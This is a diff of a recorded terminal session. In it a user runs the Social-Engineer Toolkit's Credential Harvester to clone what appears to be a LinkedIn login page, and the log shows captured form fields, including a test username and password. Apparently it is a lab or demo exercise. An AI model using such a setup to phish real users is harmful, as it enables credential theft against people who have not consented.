@@ -1,11 +1,16 @@
 Script started on 2023-11-25 21:48:23-03:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="120" LINES="30"]
-[?2004h]0;albus@NBBINO: ~[;32m┌──([1;34malbus㉿NBBINO[;32m)-[[0;1m~[;32m]
+[?2004h]0;albus@NBBINO: ~[;32m┌──([1;34malbus㉿NBBINO[;32m)-[[0;1m~[;32m]
+
 [;32m└─[1;34m$[0m sudo su
-[?2004l[sudo] password for albus: 
-[?2004h]0;root@NBBINO: /home/albus[;94m┌──([1;31mroot㉿NBBINO[;94m)-[[0;1m/home/albus[;94m]
-[;94m└─[1;31m#[0m [H[2J]0;root@NBBINO: /home/albus[;94m┌──([1;31mroot㉿NBBINO[;94m)-[[0;1m/home/albus[;94m]
+[?2004l
+[sudo] password for albus: 
+[?2004h]0;root@NBBINO: /home/albus[;94m┌──([1;31mroot㉿NBBINO[;94m)-[[0;1m/home/albus[;94m]
+
+[;94m└─[1;31m#[0m [H[2J]0;root@NBBINO: /home/albus[;94m┌──([1;31mroot㉿NBBINO[;94m)-[[0;1m/home/albus[;94m]
+
 [;94m└─[1;31m#[0m setoolkit
-[?2004l[94m[1m[-] [0mNew set.config.py file generated on: 2023-11-25 21:48:41.728858
+[?2004l
+[94m[1m[-] [0mNew set.config.py file generated on: 2023-11-25 21:48:41.728858
 [94m[1m[-] [0mVerifying configuration update...
 [92m[1m[*] [0mUpdate verified, config timestamp is: 2023-11-25 21:48:41.728858
 [92m[1m[*] [0mSET is using the new config, no need to restart
@@ -65,7 +70,7 @@ Visit [93mhttps://github.com/trustedsec/ptf[94m to update all your tools!
 
 [1m   The Social-Engineer Toolkit is a product of TrustedSec.
 
-           Visit: [92mhttps://www.trustedsec.com
+           Visit: [92mhttps://www.instagram.com
 [0m
 [94m   It's easy to update using the PenTesters Framework! (PTF)
 Visit [93mhttps://github.com/trustedsec/ptf[94m to update all your tools!
@@ -164,14 +169,21 @@ this is how networking works.
 [*] This could take a little bit...[0m
 [91m
 The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.[0m
-[94m[*] The Social-Engineer Toolkit Credential Harvester Attack
-[*] Credential Harvester is running on port 80
-[*] Information will be displayed to you as it arrives below:[0m
+[94m[*] The Social-Engineer Toolkit Credential Harvester Attack
+
+[*] Credential Harvester is running on port 80
+
+[*] Information will be displayed to you as it arrives below:
+[0m
 172.20.128.1 - - [25/Nov/2023 21:49:27] "GET / HTTP/1.1" 200 -
-[91m[*] WE GOT A HIT! Printing the output:[92m
-PARAM: {"pageKey":"d_homepage-guest-home_jsbeacon","metricsType":"pageLoadTime","metricsValue":1174}
-[91m[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
-
+[91m[*] WE GOT A HIT! Printing the output:
+[92m
+PARAM: {"pageKey":"d_homepage-guest-home_jsbeacon","metricsType":"pageLoadTime","metricsValue":1174}
+
+[91m[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+
 [0m
 172.20.128.1 - - [25/Nov/2023 21:49:28] "POST /homepage-guest/api/ingraphs/gauge HTTP/1.1" 302 -
 ----------------------------------------
@@ -636,17 +648,28 @@ Traceback (most recent call last):
           ^^^^^^^^^^^^^^^^^^^
 UnicodeDecodeError: 'utf-8' codec can't decode byte 0x8b in position 1: invalid start byte
 ----------------------------------------
-[91m[*] WE GOT A HIT! Printing the output:[92m
-[91mPOSSIBLE USERNAME FIELD FOUND: loginCsrfParam=0a4b8952-0d33-47bc-8eda-b8ee2e7e22d4[92m
-PARAM: session_key=Teste
-[91mPOSSIBLE PASSWORD FIELD FOUND: session_password=teste1234[92m
-PARAM: session_redirect=
-PARAM: trk=homepage-basic_sign-in-submit
-PARAM: controlId=d_homepage-guest-home-homepage-basic_sign-in-submit-btn
-PARAM: pageInstance=urn:li:page:d_homepage-guest-home_jsbeacon;DxAtI3tPQ2yXKzzxiTTIpg==
-PARAM: apfc={"df":{"a":"b6kl2/0KjmcScCXoohUdLA==","b":null,"c":null,"error":"TypeError:+Cannot+read+properties+of+undefined+(reading+'generateKey')"}}
-[91m[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
-
+[91m[*] WE GOT A HIT! Printing the output:
+[92m
+[91mPOSSIBLE USERNAME FIELD FOUND: loginCsrfParam=0a4b8952-0d33-47bc-8eda-b8ee2e7e22d4
+[92m
+PARAM: session_key=Teste
+
+[91mPOSSIBLE PASSWORD FIELD FOUND: session_password=teste1234
+[92m
+PARAM: session_redirect=
+
+PARAM: trk=homepage-basic_sign-in-submit
+
+PARAM: controlId=d_homepage-guest-home-homepage-basic_sign-in-submit-btn
+
+PARAM: pageInstance=urn:li:page:d_homepage-guest-home_jsbeacon;DxAtI3tPQ2yXKzzxiTTIpg==
+
+PARAM: apfc={"df":{"a":"b6kl2/0KjmcScCXoohUdLA==","b":null,"c":null,"error":"TypeError:+Cannot+read+properties+of+undefined+(reading+'generateKey')"}}
+
+[91m[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+
 [0m
 172.20.128.1 - - [25/Nov/2023 21:49:44] "POST /login-submit HTTP/1.1" 302 -
 ----------------------------------------
@@ -754,10 +777,14 @@ Traceback (most recent call last):
           ^^^^^^^^^^^^^^^^^^^
 UnicodeDecodeError: 'utf-8' codec can't decode byte 0x8b in position 1: invalid start byte
 ----------------------------------------
-[91m[*] WE GOT A HIT! Printing the output:[92m
-PARAM: {"pageKey":"d_homepage-guest-home_jsbeacon","metricsType":"clsTime","metricsValue":0.0044739740723702464}
-[91m[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
-
+[91m[*] WE GOT A HIT! Printing the output:
+[92m
+PARAM: {"pageKey":"d_homepage-guest-home_jsbeacon","metricsType":"clsTime","metricsValue":0.0044739740723702464}
+
+[91m[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+
+
 [0m
 172.20.128.1 - - [25/Nov/2023 21:49:44] "POST /homepage-guest/api/ingraphs/gauge?csrfToken=null HTTP/1.1" 302 -
 ----------------------------------------
@@ -924,12 +951,16 @@ Visit [93mhttps://github.com/trustedsec/ptf[94m to update all your tools!
  Hack the Gibson...and remember...hugs are worth more than handshakes.
 
 
-[?2004h]0;root@NBBINO: /home/albus[;94m┌──([1;31mroot㉿NBBINO[;94m)-[[0;1m/home/albus[;94m]
-[;94m└─[1;31m#[0m exit
-[?2004lexit
+[?2004h]0;root@NBBINO: /home/albus[;94m┌──([1;31mroot㉿NBBINO[;94m)-[[0;1m/home/albus[;94m]
 
-[?2004h]0;albus@NBBINO: ~[;32m┌──([1;34malbus㉿NBBINO[;32m)-[[0;1m~[;32m]
+[;94m└─[1;31m#[0m exit
+[?2004l
+exit
+
+[?2004h]0;albus@NBBINO: ~[;32m┌──([1;34malbus㉿NBBINO[;32m)-[[0;1m~[;32m]
+
 [;32m└─[1;34m$[0m exit
-[?2004lexit
+[?2004l
+exit
 
 Script done on 2023-11-25 21:50:29-03:00 [COMMAND_EXIT_CODE="0"]
